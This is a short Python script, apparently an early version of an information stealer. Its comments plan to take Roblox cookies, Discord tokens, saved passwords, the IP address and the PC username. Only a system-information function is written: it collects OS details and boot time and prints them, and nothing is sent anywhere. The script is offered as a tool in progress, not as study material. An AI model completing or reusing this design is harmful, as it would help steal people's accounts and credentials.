#THIS IS A PRODUCTION SCRIPT DO NOT USE YET!
#def roblox: try to get roblox cookie then get info from it
#def pcinfo: try to get pc username
#def ip: try to get ip
#def discord: try to get discord tokens
#def passwords: try to get passwords
import platform
import psutil # dependency
from datetime import datetime
def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor
def pcinfo():
    info = []
    unname = platform.uname()
    try:
        #system info
        info.append({unname.system})
        info.append({unname.node})
        info.append({unname.release})
        info.append({unname.version})
        info.append({unname.machine})
        info.append({unname.processor})
        # date and time pc was booted 
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        btt = f'{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}'
        info.append(btt)
        return info
    except Exception as e:
        return e
if __name__ == "__main__":
    data = []
    data.append(pcinfo())
    print(data)